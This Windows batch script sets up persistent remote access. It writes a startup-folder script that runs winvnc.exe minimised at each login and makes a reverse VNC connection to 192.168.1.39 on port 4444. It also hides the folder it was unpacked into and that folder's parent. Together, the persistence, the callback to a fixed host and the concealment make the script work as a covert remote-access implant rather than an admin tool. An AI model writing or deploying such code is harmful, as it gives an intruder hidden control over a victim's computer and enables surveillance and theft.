@echo off

REM Determine the directory where this batch file is located
set script_dir=%~dp0

REM Create the batch file for startup folder (startup_winvnc.bat)
(
  echo @echo off
  echo timeout /t 3 >nul  REM Wait 3 seconds for computer startup
  echo cd /d "%~dp0"
  echo start /min "" winvnc.exe  REM Start winvnc.exe in minimized window
  echo timeout /t 7 >nul  REM Wait for 7 seconds for user to allow permissions
  echo call "%~dp0run_winvnc.bat"
) > "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\startup_winvnc.bat"

REM Create the batch file to run winvnc.exe (run_winvnc.bat)
(
  echo @echo off
  echo taskkill /im winvnc.exe /f >nul  REM Kill all instances of winvnc.exe
  echo timeout /t 1 >nul  REM Wait 1 second after killing processes
  echo start winvnc.exe -run  REM Start winvnc.exe with batch commands
  echo timeout /t 1 >nul  REM Wait 1 second before connecting
  echo winvnc.exe -connect 192.168.1.39::4444  REM Connect to the specified address
) > "%script_dir%run_winvnc.bat"

REM Check if both batch files exist in their respective locations
if exist "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\startup_winvnc.bat" (
  echo startup_winvnc.bat created successfully in Startup folder.
) else (
  echo Failed to create startup_winvnc.bat in Startup folder.
)

if exist "%script_dir%run_winvnc.bat" (
  echo run_winvnc.bat created successfully in current directory.
) else (
  echo Failed to create run_winvnc.bat in current directory.
)

REM Hide the extracted Client-load folder and its parent folder
attrib +h "%script_dir%\.."
attrib +h "%script_dir%\..\.."

REM End of main.bat
